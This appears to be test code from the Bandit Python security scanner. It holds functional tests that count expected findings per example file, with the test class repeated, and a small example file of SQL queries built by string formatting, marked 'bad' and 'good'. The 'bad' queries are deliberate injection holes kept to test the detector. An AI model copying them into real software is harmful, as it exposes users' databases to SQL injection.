        self.check_example('os-startfile.py', expect)

    def test_os_system(self):
        '''Test for `os.system`.'''
        expect = {'SEVERITY': {'LOW': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('os_system.py', expect)

    def test_pickle(self):
        '''Test for the `pickle` module.'''
        expect = {
            'SEVERITY': {'LOW': 2, 'MEDIUM': 6},
            'CONFIDENCE': {'HIGH': 8}
        }
        self.check_example('pickle_deserialize.py', expect)

    def test_popen_wrappers(self):
        '''Test the `popen2` and `commands` modules.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('popen_wrappers.py', expect)

    def test_random_module(self):
        '''Test for the `random` module.'''
        expect = {'SEVERITY': {'LOW': 6}, 'CONFIDENCE': {'HIGH': 6}}
        self.check_example('random_module.py', expect)

    def test_requests_ssl_verify_disabled(self):
        '''Test for the `requests` library skipping verification.'''
        expect = {'SEVERITY': {'HIGH': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('requests-ssl-verify-disabled.py', expect)

    def test_skip(self):
        '''Test `#nosec` and `#noqa` comments.'''
        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'HIGH': 5}}
        self.check_example('skip.py', expect)

    def test_ignore_skip(self):
        '''Test --ignore-nosec flag.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('skip.py', expect, ignore_nosec=True)

    def test_sql_statements(self):
        '''Test for SQL injection through string building.'''
        expect = {
            'SEVERITY': {'MEDIUM': 12},                    
            'CONFIDENCE': {'LOW': 7, 'MEDIUM': 5}}                    
        self.check_example('sql_statements.py', expect)

    def test_ssl_insecure_version(self):
        '''Test for insecure SSL protocol versions.'''
        expect = {
            'SEVERITY': {'LOW': 1, 'MEDIUM': 10, 'HIGH': 7},
            'CONFIDENCE': {'LOW': 0, 'MEDIUM': 11, 'HIGH': 7}
        }
        self.check_example('ssl-insecure-version.py', expect)

    def test_subprocess_shell(self):
        '''Test for `subprocess.Popen` with `shell=True`.'''
        expect = {
            'SEVERITY': {'HIGH': 3, 'MEDIUM': 1, 'LOW': 14},
            'CONFIDENCE': {'HIGH': 17, 'LOW': 1}
        }
        self.check_example('subprocess_shell.py', expect)

    def test_urlopen(self):
        '''Test for dangerous URL opening.'''
        expect = {'SEVERITY': {'MEDIUM': 14}, 'CONFIDENCE': {'HIGH': 14}}
        self.check_example('urlopen.py', expect)

    def test_utils_shell(self):
        '''Test for `utils.execute*` with `shell=True`.'''
        expect = {
            'SEVERITY': {'LOW': 5},
            'CONFIDENCE': {'HIGH': 5}
        }
        self.check_example('utils-shell.py', expect)

    def test_wildcard_injection(self):
        '''Test for wildcard injection in shell commands.'''
        expect = {
            'SEVERITY': {'HIGH': 4, 'MEDIUM': 0, 'LOW': 10},
            'CONFIDENCE': {'MEDIUM': 5, 'HIGH': 9}
        }
        self.check_example('wildcard-injection.py', expect)

    def test_yaml(self):
        '''Test for `yaml.load`.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('yaml_load.py', expect)

    def test_jinja2_templating(self):
        '''Test jinja templating for potential XSS bugs.'''
        expect = {
            'SEVERITY': {'HIGH': 4},
            'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}
        }
        self.check_example('jinja2_templating.py', expect)

    def test_secret_config_option(self):
        '''Test for `secret=True` in Oslo's config.'''
        expect = {
            'SEVERITY': {'LOW': 1, 'MEDIUM': 2},
            'CONFIDENCE': {'MEDIUM': 3}
        }
        self.check_example('secret-config-option.py', expect)

    def test_mako_templating(self):
        '''Test Mako templates for XSS.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('mako_templating.py', expect)

    def test_xml(self):
        '''Test xml vulnerabilities.'''
        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}
        self.check_example('xml_etree_celementtree.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 2}}
        self.check_example('xml_expatbuilder.py', expect)

        expect = {'SEVERITY': {'LOW': 3, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}}
        self.check_example('xml_lxml.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}
        self.check_example('xml_pulldom.py', expect)

        expect = {'SEVERITY': {'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('xml_xmlrpc.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}
        self.check_example('xml_etree_elementtree.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 1}}
        self.check_example('xml_expatreader.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}
        self.check_example('xml_minidom.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 6},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 6}}
        self.check_example('xml_sax.py', expect)

    def test_httpoxy(self):
        '''Test httpoxy vulnerability.'''
        expect = {'SEVERITY': {'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('httpoxy_cgihandler.py', expect)
        self.check_example('httpoxy_twisted_script.py', expect)
        self.check_example('httpoxy_twisted_directory.py', expect)

    def test_asserts(self):
        '''Test catching the use of assert.'''
        expect = {'SEVERITY': {'LOW': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('assert.py', expect)

    def test_paramiko_injection(self):
        '''Test paramiko command execution.'''
        expect = {'SEVERITY': {'MEDIUM': 2},
                  'CONFIDENCE': {'MEDIUM': 2}}
        self.check_example('paramiko_injection.py', expect)

    def test_partial_path(self):
        '''Test process spawning with partial file paths.'''
        expect = {'SEVERITY': {'LOW': 11},
                  'CONFIDENCE': {'HIGH': 11}}

        self.check_example('partial_path_process.py', expect)

    def test_try_except_continue(self):
        '''Test try, except, continue detection.'''
        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']
                    if x.__name__ == 'try_except_continue'))

        test._config = {'check_typed_exception': True}
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('try_except_continue.py', expect)

        test._config = {'check_typed_exception': False}
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('try_except_continue.py', expect)

    def test_try_except_pass(self):
        '''Test try, except pass detection.'''
        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']
                     if x.__name__ == 'try_except_pass'))

        test._config = {'check_typed_exception': True}
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('try_except_pass.py', expect)

        test._config = {'check_typed_exception': False}
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('try_except_pass.py', expect)

    def test_metric_gathering(self):
        expect = {
            'nosec': 2, 'loc': 7,
            'issues': {'CONFIDENCE': {'HIGH': 5}, 'SEVERITY': {'LOW': 5}}
        }
        self.check_metrics('skip.py', expect)
        expect = {
            'nosec': 0, 'loc': 4,
            'issues': {'CONFIDENCE': {'HIGH': 2}, 'SEVERITY': {'LOW': 2}}
        }
        self.check_metrics('imports.py', expect)

    def test_weak_cryptographic_key(self):
        '''Test for weak key sizes.'''
        expect = {
            'SEVERITY': {'MEDIUM': 8, 'HIGH': 6},
            'CONFIDENCE': {'HIGH': 14}
        }
        self.check_example('weak_cryptographic_key_sizes.py', expect)

    def test_multiline_code(self):
        '''Test issues in multiline statements return code as expected.'''
        self.run_example('multiline_statement.py')
        self.assertEqual(0, len(self.b_mgr.skipped))
        self.assertEqual(1, len(self.b_mgr.files_list))
        self.assertTrue(self.b_mgr.files_list[0].endswith(
                        'multiline_statement.py'))

        issues = self.b_mgr.get_issue_list()
        self.assertEqual(2, len(issues))
        self.assertTrue(
            issues[0].fname.endswith('examples/multiline_statement.py')
        )

        self.assertEqual(1, issues[0].lineno)
        self.assertEqual(list(range(1, 3)), issues[0].linerange)
        self.assertIn('subprocess', issues[0].get_code())
        self.assertEqual(5, issues[1].lineno)
        self.assertEqual(list(range(3, 6 + 1)), issues[1].linerange)
        self.assertIn('shell=True', issues[1].get_code())

    def test_code_line_numbers(self):
        self.run_example('binding.py')
        issues = self.b_mgr.get_issue_list()

        code_lines = issues[0].get_code().splitlines()
        lineno = issues[0].lineno
        self.assertEqual("%i " % (lineno - 1), code_lines[0][:2])
        self.assertEqual("%i " % (lineno), code_lines[1][:2])
        self.assertEqual("%i " % (lineno + 1), code_lines[2][:2])

    def test_flask_debug_true(self):
        expect = {
            'SEVERITY': {'HIGH': 1},
            'CONFIDENCE': {'MEDIUM': 1}
        }
        self.check_example('flask_debug.py', expect)

    def test_nosec(self):
        expect = {
            'SEVERITY': {},
            'CONFIDENCE': {}
        }
        self.check_example('nosec.py', expect)

    def test_baseline_filter(self):
        issue_text = ('A Flask app appears to be run with debug=True, which '
                      'exposes the Werkzeug debugger and allows the execution '
                      'of arbitrary code.')
        json = """{
          "results": [
            {
              "code": "...",
              "filename": "%s/examples/flask_debug.py",
              "issue_confidence": "MEDIUM",
              "issue_severity": "HIGH",
              "issue_text": "%s",
              "line_number": 10,
              "line_range": [
                10
              ],
              "test_name": "flask_debug_true",
              "test_id": "B201"
            }
          ]
        }
        """ % (os.getcwd(), issue_text)

        self.b_mgr.populate_baseline(json)
        self.run_example('flask_debug.py')
        self.assertEqual(1, len(self.b_mgr.baseline))
        self.assertEqual({}, self.b_mgr.get_issue_list())

    def test_blacklist_input(self):
        expect = {
            'SEVERITY': {'HIGH': 1},
            'CONFIDENCE': {'HIGH': 1}
        }
        self.check_example('input.py', expect)

import sqlalchemy

# bad
query = "SELECT * FROM foo WHERE id = '%s'" % identifier
query = "INSERT INTO foo VALUES ('a', 'b', '%s')" % value
query = "DELETE FROM foo WHERE id = '%s'" % identifier
query = "UPDATE foo SET value = 'b' WHERE id = '%s'" % identifier
query = """WITH cte AS (SELECT x FROM foo)
SELECT x FROM cte WHERE x = '%s'""" % identifier

# bad
cur.execute("SELECT * FROM foo WHERE id = '%s'" % identifier)
cur.execute("INSERT INTO foo VALUES ('a', 'b', '%s')" % value)
cur.execute("DELETE FROM foo WHERE id = '%s'" % identifier)
cur.execute("UPDATE foo SET value = 'b' WHERE id = '%s'" % identifier)

# good
cur.execute("SELECT * FROM foo WHERE id = '%s'", identifier)
cur.execute("INSERT INTO foo VALUES ('a', 'b', '%s')", value)
cur.execute("DELETE FROM foo WHERE id = '%s'", identifier)
cur.execute("UPDATE foo SET value = 'b' WHERE id = '%s'", identifier)

# bad
query = "SELECT " + val + " FROM " + val +" WHERE id = " + val                    

# bad
cur.execute("SELECT " + val + " FROM " + val +" WHERE id = " + val)                    


# bug: https://bugs.launchpad.net/bandit/+bug/1479625
def a():
    def b():
        pass
    return b

a()("SELECT %s FROM foo" % val)

# real world false positives
choices=[('server_list', _("Select from active instances"))]
print("delete from the cache as the first argument")

# -*- coding:utf-8 -*-
#
# Copyright 2014 Hewlett-Packard Development Company, L.P.
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

import os

import six
import testtools

from bandit.core import config as b_config
from bandit.core import constants as C
from bandit.core import manager as b_manager
from bandit.core import metrics
from bandit.core import test_set as b_test_set


class FunctionalTests(testtools.TestCase):

    '''Functional tests for bandit test plugins.

    This set of tests runs bandit against each example file in turn
    and records the score returned. This is compared to a known good value.
    When new tests are added to an example the expected result should be
    adjusted to match.
    '''

    def setUp(self):
        super(FunctionalTests, self).setUp()
        # NOTE(tkelsey): bandit is very sensitive to paths, so stitch
        # them up here for the testing environment.
        #
        path = os.path.join(os.getcwd(), 'bandit', 'plugins')
        b_conf = b_config.BanditConfig()
        self.b_mgr = b_manager.BanditManager(b_conf, 'file')
        self.b_mgr.b_conf._settings['plugins_dir'] = path
        self.b_mgr.b_ts = b_test_set.BanditTestSet(config=b_conf)

    def run_example(self, example_script, ignore_nosec=False):
        '''A helper method to run the specified test

        This method runs the test, which populates the self.b_mgr.scores
        value. Call this directly if you need to run a test, but do not
        need to test the resulting scores against specified values.
        :param example_script: Filename of an example script to test
        '''
        path = os.path.join(os.getcwd(), 'examples', example_script)
        self.b_mgr.ignore_nosec = ignore_nosec
        self.b_mgr.discover_files([path], True)
        self.b_mgr.run_tests()

    def check_example(self, example_script, expect, ignore_nosec=False):
        '''A helper method to test the scores for example scripts.

        :param example_script: Filename of an example script to test
        :param expect: dict with expected counts of issue types
        '''
        # reset scores for subsequent calls to check_example
        self.b_mgr.scores = []
        self.run_example(example_script, ignore_nosec=ignore_nosec)
        expected = 0
        result = 0
        for test_scores in self.b_mgr.scores:
            for score_type in test_scores:
                self.assertIn(score_type, expect)
                for rating in expect[score_type]:
                    expected += (
                        expect[score_type][rating] * C.RANKING_VALUES[rating]
                    )
                result += sum(test_scores[score_type])
        self.assertEqual(expected, result)

    def check_metrics(self, example_script, expect):
        '''A helper method to test the metrics being returned.

        :param example_script: Filename of an example script to test
        :param expect: dict with expected values of metrics
        '''
        self.b_mgr.metrics = metrics.Metrics()
        self.b_mgr.scores = []
        self.run_example(example_script)

        # test general metrics (excludes issue counts)
        m = self.b_mgr.metrics.data
        for k in expect:
            if k != 'issues':
                self.assertEqual(expect[k], m['_totals'][k])
        # test issue counts
        if 'issues' in expect:
            for (criteria, default) in C.CRITERIA:
                for rank in C.RANKING:
                    label = '{0}.{1}'.format(criteria, rank)
                    expected = 0
                    if expect['issues'].get(criteria, None).get(rank, None):
                        expected = expect['issues'][criteria][rank]
                    self.assertEqual(expected, m['_totals'][label])

    def test_binding(self):
        '''Test the bind-to-0.0.0.0 example.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'MEDIUM': 1}}
        self.check_example('binding.py', expect)

    def test_crypto_md5(self):
        '''Test the `hashlib.md5` example.'''
        expect = {'SEVERITY': {'MEDIUM': 11},
                  'CONFIDENCE': {'HIGH': 11}}
        self.check_example('crypto-md5.py', expect)

    def test_ciphers(self):
        '''Test the `Crypto.Cipher` example.'''
        expect = {'SEVERITY': {'HIGH': 13},
                  'CONFIDENCE': {'HIGH': 13}}
        self.check_example('ciphers.py', expect)

    def test_cipher_modes(self):
        '''Test for insecure cipher modes.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('cipher-modes.py', expect)

    def test_eval(self):
        '''Test the `eval` example.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('eval.py', expect)

    def test_mark_safe(self):
        '''Test the `mark_safe` example.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('mark_safe.py', expect)

    def test_exec(self):
        '''Test the `exec` example.'''
        filename = 'exec-{}.py'
        if six.PY2:
            filename = filename.format('py2')
            expect = {'SEVERITY': {'MEDIUM': 2}, 'CONFIDENCE': {'HIGH': 2}}
        else:
            filename = filename.format('py3')
            expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example(filename, expect)

    def test_exec_as_root(self):
        '''Test for the `run_as_root=True` keyword argument.'''
        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'MEDIUM': 5}}
        self.check_example('exec-as-root.py', expect)

    def test_hardcoded_passwords(self):
        '''Test for hard-coded passwords.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'MEDIUM': 7}}
        self.check_example('hardcoded-passwords.py', expect)

    def test_hardcoded_tmp(self):
        '''Test for hard-coded /tmp, /var/tmp, /dev/shm.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'MEDIUM': 3}}
        self.check_example('hardcoded-tmp.py', expect)

    def test_httplib_https(self):
        '''Test for `httplib.HTTPSConnection`.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('httplib_https.py', expect)

    def test_imports_aliases(self):
        '''Test the `import X as Y` syntax.'''
        expect = {
            'SEVERITY': {'LOW': 4, 'MEDIUM': 5, 'HIGH': 0},
            'CONFIDENCE': {'HIGH': 9}
        }
        self.check_example('imports-aliases.py', expect)

    def test_imports_from(self):
        '''Test the `from X import Y` syntax.'''
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('imports-from.py', expect)

    def test_imports_function(self):
        '''Test the `__import__` function.'''
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('imports-function.py', expect)

    def test_telnet_usage(self):
        '''Test for `import telnetlib` and Telnet.* calls.'''
        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('telnetlib.py', expect)

    def test_ftp_usage(self):
        '''Test for `import ftplib` and FTP.* calls.'''
        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('ftplib.py', expect)

    def test_imports(self):
        '''Test for dangerous imports.'''
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('imports.py', expect)

    def test_mktemp(self):
        '''Test for `tempfile.mktemp`.'''
        expect = {'SEVERITY': {'MEDIUM': 4}, 'CONFIDENCE': {'HIGH': 4}}
        self.check_example('mktemp.py', expect)

    def test_nonsense(self):
        '''Test that a syntactically invalid module is skipped.'''
        self.run_example('nonsense.py')
        self.assertEqual(1, len(self.b_mgr.skipped))

    def test_okay(self):
        '''Test a vulnerability-free file.'''
        expect = {'SEVERITY': {}, 'CONFIDENCE': {}}
        self.check_example('okay.py', expect)

    def test_os_chmod(self):
        '''Test setting file permissions.'''
        filename = 'os-chmod-{}.py'
        if six.PY2:
            filename = filename.format('py2')
        else:
            filename = filename.format('py3')
        expect = {
            'SEVERITY': {'MEDIUM': 2, 'HIGH': 8},
            'CONFIDENCE': {'MEDIUM': 1, 'HIGH': 9}
        }
        self.check_example(filename, expect)

    def test_os_exec(self):
        '''Test for `os.exec*`.'''
        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}
        self.check_example('os-exec.py', expect)

    def test_os_popen(self):
        '''Test for `os.popen`.'''
        expect = {'SEVERITY': {'LOW': 8, 'MEDIUM': 0, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 9}}
        self.check_example('os-popen.py', expect)

    def test_os_spawn(self):
        '''Test for `os.spawn*`.'''
        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}
        self.check_example('os-spawn.py', expect)

    def test_os_startfile(self):
        '''Test for `os.startfile`.'''
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'MEDIUM': 3}}
        self.check_example('os-startfile.py', expect)

    def test_os_system(self):
        '''Test for `os.system`.'''
        expect = {'SEVERITY': {'LOW': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('os_system.py', expect)

    def test_pickle(self):
        '''Test for the `pickle` module.'''
        expect = {
            'SEVERITY': {'LOW': 2, 'MEDIUM': 6},
            'CONFIDENCE': {'HIGH': 8}
        }
        self.check_example('pickle_deserialize.py', expect)

    def test_popen_wrappers(self):
        '''Test the `popen2` and `commands` modules.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('popen_wrappers.py', expect)

    def test_random_module(self):
        '''Test for the `random` module.'''
        expect = {'SEVERITY': {'LOW': 6}, 'CONFIDENCE': {'HIGH': 6}}
        self.check_example('random_module.py', expect)

    def test_requests_ssl_verify_disabled(self):
        '''Test for the `requests` library skipping verification.'''
        expect = {'SEVERITY': {'HIGH': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('requests-ssl-verify-disabled.py', expect)

    def test_skip(self):
        '''Test `#nosec` and `#noqa` comments.'''
        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'HIGH': 5}}
        self.check_example('skip.py', expect)

    def test_ignore_skip(self):
        '''Test --ignore-nosec flag.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('skip.py', expect, ignore_nosec=True)

    def test_sql_statements(self):
        '''Test for SQL injection through string building.'''
        expect = {
            'SEVERITY': {'MEDIUM': 12},                    
            'CONFIDENCE': {'LOW': 7, 'MEDIUM': 5}}                    
        self.check_example('sql_statements.py', expect)

    def test_ssl_insecure_version(self):
        '''Test for insecure SSL protocol versions.'''
        expect = {
            'SEVERITY': {'LOW': 1, 'MEDIUM': 10, 'HIGH': 7},
            'CONFIDENCE': {'LOW': 0, 'MEDIUM': 11, 'HIGH': 7}
        }
        self.check_example('ssl-insecure-version.py', expect)

    def test_subprocess_shell(self):
        '''Test for `subprocess.Popen` with `shell=True`.'''
        expect = {
            'SEVERITY': {'HIGH': 3, 'MEDIUM': 1, 'LOW': 14},
            'CONFIDENCE': {'HIGH': 17, 'LOW': 1}
        }
        self.check_example('subprocess_shell.py', expect)

    def test_urlopen(self):
        '''Test for dangerous URL opening.'''
        expect = {'SEVERITY': {'MEDIUM': 14}, 'CONFIDENCE': {'HIGH': 14}}
        self.check_example('urlopen.py', expect)

    def test_utils_shell(self):
        '''Test for `utils.execute*` with `shell=True`.'''
        expect = {
            'SEVERITY': {'LOW': 5},
            'CONFIDENCE': {'HIGH': 5}
        }
        self.check_example('utils-shell.py', expect)

    def test_wildcard_injection(self):
        '''Test for wildcard injection in shell commands.'''
        expect = {
            'SEVERITY': {'HIGH': 4, 'MEDIUM': 0, 'LOW': 10},
            'CONFIDENCE': {'MEDIUM': 5, 'HIGH': 9}
        }
        self.check_example('wildcard-injection.py', expect)

    def test_yaml(self):
        '''Test for `yaml.load`.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('yaml_load.py', expect)

    def test_jinja2_templating(self):
        '''Test jinja templating for potential XSS bugs.'''
        expect = {
            'SEVERITY': {'HIGH': 4},
            'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}
        }
        self.check_example('jinja2_templating.py', expect)

    def test_secret_config_option(self):
        '''Test for `secret=True` in Oslo's config.'''
        expect = {
            'SEVERITY': {'LOW': 1, 'MEDIUM': 2},
            'CONFIDENCE': {'MEDIUM': 3}
        }
        self.check_example('secret-config-option.py', expect)

    def test_mako_templating(self):
        '''Test Mako templates for XSS.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('mako_templating.py', expect)

    def test_xml(self):
        '''Test xml vulnerabilities.'''
        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}
        self.check_example('xml_etree_celementtree.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 2}}
        self.check_example('xml_expatbuilder.py', expect)

        expect = {'SEVERITY': {'LOW': 3, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}}
        self.check_example('xml_lxml.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}
        self.check_example('xml_pulldom.py', expect)

        expect = {'SEVERITY': {'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('xml_xmlrpc.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}
        self.check_example('xml_etree_elementtree.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 1}}
        self.check_example('xml_expatreader.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}
        self.check_example('xml_minidom.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 6},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 6}}
        self.check_example('xml_sax.py', expect)

    def test_httpoxy(self):
        '''Test httpoxy vulnerability.'''
        expect = {'SEVERITY': {'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('httpoxy_cgihandler.py', expect)
        self.check_example('httpoxy_twisted_script.py', expect)
        self.check_example('httpoxy_twisted_directory.py', expect)

    def test_asserts(self):
        '''Test catching the use of assert.'''
        expect = {'SEVERITY': {'LOW': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('assert.py', expect)

    def test_paramiko_injection(self):
        '''Test paramiko command execution.'''
        expect = {'SEVERITY': {'MEDIUM': 2},
                  'CONFIDENCE': {'MEDIUM': 2}}
        self.check_example('paramiko_injection.py', expect)

    def test_partial_path(self):
        '''Test process spawning with partial file paths.'''
        expect = {'SEVERITY': {'LOW': 11},
                  'CONFIDENCE': {'HIGH': 11}}

        self.check_example('partial_path_process.py', expect)

    def test_try_except_continue(self):
        '''Test try, except, continue detection.'''
        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']
                    if x.__name__ == 'try_except_continue'))

        test._config = {'check_typed_exception': True}
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('try_except_continue.py', expect)

        test._config = {'check_typed_exception': False}
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('try_except_continue.py', expect)

    def test_try_except_pass(self):
        '''Test try, except pass detection.'''
        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']
                     if x.__name__ == 'try_except_pass'))

        test._config = {'check_typed_exception': True}
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('try_except_pass.py', expect)

        test._config = {'check_typed_exception': False}
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('try_except_pass.py', expect)

    def test_metric_gathering(self):
        expect = {
            'nosec': 2, 'loc': 7,
            'issues': {'CONFIDENCE': {'HIGH': 5}, 'SEVERITY': {'LOW': 5}}
        }
        self.check_metrics('skip.py', expect)
        expect = {
            'nosec': 0, 'loc': 4,
            'issues': {'CONFIDENCE': {'HIGH': 2}, 'SEVERITY': {'LOW': 2}}
        }
        self.check_metrics('imports.py', expect)

    def test_weak_cryptographic_key(self):
        '''Test for weak key sizes.'''
        expect = {
            'SEVERITY': {'MEDIUM': 8, 'HIGH': 6},
            'CONFIDENCE': {'HIGH': 14}
        }
        self.check_example('weak_cryptographic_key_sizes.py', expect)

    def test_multiline_code(self):
        '''Test issues in multiline statements return code as expected.'''
        self.run_example('multiline_statement.py')
        self.assertEqual(0, len(self.b_mgr.skipped))
        self.assertEqual(1, len(self.b_mgr.files_list))
        self.assertTrue(self.b_mgr.files_list[0].endswith(
                        'multiline_statement.py'))

        issues = self.b_mgr.get_issue_list()
        self.assertEqual(2, len(issues))
        self.assertTrue(
            issues[0].fname.endswith('examples/multiline_statement.py')
        )

        self.assertEqual(1, issues[0].lineno)
        self.assertEqual(list(range(1, 3)), issues[0].linerange)
        self.assertIn('subprocess', issues[0].get_code())
        self.assertEqual(5, issues[1].lineno)
        self.assertEqual(list(range(3, 6 + 1)), issues[1].linerange)
        self.assertIn('shell=True', issues[1].get_code())

    def test_code_line_numbers(self):
        self.run_example('binding.py')
        issues = self.b_mgr.get_issue_list()

        code_lines = issues[0].get_code().splitlines()
        lineno = issues[0].lineno
        self.assertEqual("%i " % (lineno - 1), code_lines[0][:2])
        self.assertEqual("%i " % (lineno), code_lines[1][:2])
        self.assertEqual("%i " % (lineno + 1), code_lines[2][:2])

    def test_flask_debug_true(self):
        expect = {
            'SEVERITY': {'HIGH': 1},
            'CONFIDENCE': {'MEDIUM': 1}
        }
        self.check_example('flask_debug.py', expect)

    def test_nosec(self):
        expect = {
            'SEVERITY': {},
            'CONFIDENCE': {}
        }
        self.check_example('nosec.py', expect)

    def test_baseline_filter(self):
        issue_text = ('A Flask app appears to be run with debug=True, which '
                      'exposes the Werkzeug debugger and allows the execution '
                      'of arbitrary code.')
        json = """{
          "results": [
            {
              "code": "...",
              "filename": "%s/examples/flask_debug.py",
              "issue_confidence": "MEDIUM",
              "issue_severity": "HIGH",
              "issue_text": "%s",
              "line_number": 10,
              "line_range": [
                10
              ],
              "test_name": "flask_debug_true",
              "test_id": "B201"
            }
          ]
        }
        """ % (os.getcwd(), issue_text)

        self.b_mgr.populate_baseline(json)
        self.run_example('flask_debug.py')
        self.assertEqual(1, len(self.b_mgr.baseline))
        self.assertEqual({}, self.b_mgr.get_issue_list())

